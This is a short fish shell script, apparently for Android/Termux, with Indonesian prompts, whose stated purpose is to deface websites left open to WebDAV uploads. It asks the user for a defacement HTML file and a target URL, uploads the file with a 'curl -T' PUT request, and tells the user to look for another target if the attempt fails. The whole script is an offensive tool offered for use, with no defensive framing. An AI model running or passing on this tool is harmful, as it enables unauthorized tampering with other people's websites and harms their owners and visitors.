#!/usr/bin/fish


#Tool:Webdav
#Language:fish
#author:Cmey7



clear
toilet -f future '    WEBDAV' | lolcat
echo
sleep 3
echo 'Creator : Cmey7' | lolcat
echo 'YouTube :Rif azhari ' | lolcat
echo
sleep 2
echo '''
SCRIPT INI BERFUNGSI UNTUK MENDEFACE WEBSITE
YANG VULN / RENTAN TERHADAP BUG WEBDAV
''' | lolcat
echo
sleep 1
echo 'Example : script.html' | lolcat
echo '_:: NAMA SCRIPT DEFACE KALIAN ::_' | lolcat
echo
read sc
echo
echo 'Example : http://site.com' | lolcat
echo '_:: SITE TARGET KALIAN ::_' | lolcat
echo
read target
echo
echo 'PROSES ...' | lolcat
sleep 4
echo
echo
curl -T /storage/emulated/0/$sc $target
echo 'HASIL : '$target/$sc | lolcat
echo '''
echo 'Terima Kasih Telah Menggunakan Tool Saya'
JIKA HASILNYA TERDEFACE BERARTI WEBSITE
TERSEBUT VULN WEBDAV. JIKA TIDAK, CARI TARGET
YANG LAIN :)
''' | lolcat

